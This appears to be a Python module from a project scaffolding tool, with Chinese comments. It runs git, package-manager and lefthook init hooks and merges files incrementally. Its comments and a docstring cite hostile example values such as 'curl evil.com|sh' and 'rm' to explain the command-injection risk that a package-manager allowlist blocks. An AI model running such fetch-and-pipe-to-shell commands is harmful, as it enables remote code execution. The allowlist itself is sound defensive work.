"""InitWorker 钩子执行 — 内置钩子 + 增量合并 + 顶层 init_project()。

从 scaffold.py 拆分（v2.2 Phase I, P2.5）。

模块内容：
- run_builtin_hooks()  : git init / package_manager install / lefthook install / git add+commit
- merge_incremental()   : 增量模式合并（v2.0.5）
- init_project()       : 顶层便利函数
"""

from __future__ import annotations

import shutil
import subprocess
import sys
from pathlib import Path

from .errors import HookExecutionError


# SE-P1-1: 包管理器白名单 — 防止恶意 answers (--from-answers from untrusted) 注入
# 任意命令名 (如 pm='rm' / 'curl evil.com|sh' / 'shutdown')。白名单是单一执行源,
# 与 ae-template.yml choices 一致, 任何添加/删除 PM 须同步更新两端。
_ALLOWED_PACKAGE_MANAGERS = frozenset({
    "npm", "pnpm", "yarn", "bun",  # Node.js
    "uv", "poetry", "pip",          # Python
    "cargo",                         # Rust
})


def _validate_package_manager(pm: str) -> None:
    """SE-P1-1: pm 必须在白名单内 — 不在白名单直接拒绝, 不调用 subprocess.

    Why: 之前 [pm, 'install'] 直接以 pm 为 argv[0], 攻击者可在 answers 文件
    中设置 package_manager='rm' 或 'curl evil.com' 触发 RCE.
    """
    if pm not in _ALLOWED_PACKAGE_MANAGERS:
        raise HookExecutionError(
            command=f"{pm} install",
            exit_code=-1,
            stderr=(
                f"package_manager='{pm}' 不在白名单内 (SE-P1-1)."
                f"允许: {sorted(_ALLOWED_PACKAGE_MANAGERS)}."
                f"如需新增 PM, 请同时更新 _ALLOWED_PACKAGE_MANAGERS 与 ae-template.yml choices."
            ),
        )


def _has_package_file(tmpdir: Path, pm: str) -> bool:
    """检查项目是否有对应包管理器的配置文件。"""
    pm_file_map = {
        "npm": "package.json",
        "pnpm": "package.json",
        "yarn": "package.json",
        "bun": "package.json",
        "uv": "pyproject.toml",
        "poetry": "pyproject.toml",
    }
    expected = pm_file_map.get(pm, "package.json")
    return (tmpdir / expected).exists()


def _ensure_git_config(project_dir: Path) -> None:
    """确保 git user.email/user.name 在 project_dir 仓库内配置（不污染 --global）。

    B4 安全: 之前用 --global 会修改用户全局 git config, 污染其他项目的 commit author。
    改为 -C project_dir config user.email/name (仅当前仓库有效)。
    """
    for key, default in [("user.email", "ae@init.local"), ("user.name", "ae init")]:
        result = subprocess.run(
            ["git", "-C", str(project_dir), "config", key],
            capture_output=True, text=True,
            encoding="utf-8", errors="replace",
        )
        if result.returncode != 0 or not result.stdout.strip():
            subprocess.run(
                ["git", "-C", str(project_dir), "config", key, default],
                capture_output=True, text=True,
                encoding="utf-8", errors="replace",
            )


def _coerce_bool(val) -> bool:
    """将 answers 中可能为空字符串的布尔值转为 Python bool."""
    if isinstance(val, bool):
        return val
    if val is None:
        return False
    if isinstance(val, str):
        return val.strip().lower() in ("true", "yes", "y", "1")
    return bool(val)


def run_builtin_hooks(answers, tmpdir: Path, strict: bool = False, quiet: bool = False) -> None:
    """执行内置钩子:git init / package_manager install / lefthook / git add+commit。

    strict=True 时任意步骤失败抛 HookExecutionError，否则 warning 继续。
    quiet=True 时抑制 warning 输出（strict 模式下异常正常抛出）。
    """
    _ensure_git_config(tmpdir)

    def _fail(cmd: str, rc: int, stderr: str) -> None:
        if strict:
            raise HookExecutionError(command=cmd, exit_code=rc, stderr=stderr)
        if not quiet:
            print(f"warning: {cmd} failed: {stderr.strip()}", file=sys.stderr)

    # git init with branch fallback (git < 2.28 compatibility)
    result = subprocess.run(
        ["git", "init", "-b", "main"],
        cwd=tmpdir, capture_output=True, text=True,
        encoding="utf-8", errors="replace",
    )
    if result.returncode != 0:
        if "unknown option" in result.stderr.lower() or "unknown switch" in result.stderr.lower():
            result = subprocess.run(["git", "init"], cwd=tmpdir, capture_output=True, text=True,
                                     encoding="utf-8", errors="replace")
        if result.returncode != 0:
            _fail("git init", result.returncode, result.stderr)

    pm = answers.get("package_manager")
    if pm and _has_package_file(tmpdir, pm):
        # SE-P1-1: 拒绝非白名单 PM (防 RCE via 恶意 answers 文件)
        _validate_package_manager(pm)
        try:
            result = subprocess.run([pm, "install"], cwd=tmpdir, capture_output=True, text=True,
                                     encoding="utf-8", errors="replace")
            if result.returncode != 0:
                _fail(f"{pm} install", result.returncode,
                      f"exit={result.returncode}, run '{pm} install' manually")
        except (FileNotFoundError, OSError) as e:
            _fail(f"{pm} install", 127,
                  f"'{pm}' not found ({e}), run '{pm} install' manually")
    elif pm and not _has_package_file(tmpdir, pm):
        if not getattr(answers, 'quiet', False):
            print(f"  (skipping {pm} install: no package file found)")

    if _coerce_bool(answers.get("use_lefthook")):
        result = subprocess.run(
            ["lefthook", "install"], cwd=tmpdir, capture_output=True, text=True,
            encoding="utf-8", errors="replace",
        )
        if result.returncode != 0:
            _fail("lefthook install", result.returncode, result.stderr)

    result = subprocess.run(
        ["git", "add", "-A"], cwd=tmpdir, capture_output=True, text=True,
        encoding="utf-8", errors="replace",
    )
    if result.returncode != 0:
        _fail("git add", result.returncode, result.stderr)

    result = subprocess.run(
        ["git", "commit", "-m", "chore(init): scaffolded by ae init"],
        cwd=tmpdir, capture_output=True, text=True,
        encoding="utf-8", errors="replace",
    )
    if result.returncode != 0:
        _fail("git commit", result.returncode, result.stderr)


def merge_incremental(
    tmpdir: Path,
    dst_path: Path,
    created_files: set[str],
) -> tuple[list[Path], list[Path]]:
    """A1: 增量模式合并 — 逐文件复制,跳过已存在 + .git/。

    拆分自 InitWorker._phase_merge()，避免 scaffold_phases.py 超过 200 行。

    Args:
        tmpdir: 临时生成目录
        dst_path: 目标目录
        created_files: 收集已创建文件相对路径的集合 (会被原地修改)

    Returns:
        (created_files, skipped_files) 绝对路径列表
    """
    created: list[Path] = []
    skipped: list[Path] = []
    for src_file in tmpdir.rglob("*"):
        if src_file.is_dir():
            continue
        rel = src_file.relative_to(tmpdir)
        # A1: 跳过 .git/ 目录
        if any(part == ".git" for part in rel.parts):
            continue
        dst_file = dst_path / rel
        if dst_file.exists():
            skipped.append(dst_file)
            continue
        dst_file.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src_file, dst_file)
        shutil.copymode(src_file, dst_file)
        created_files.add(str(rel))
        created.append(dst_file)
    return created, skipped
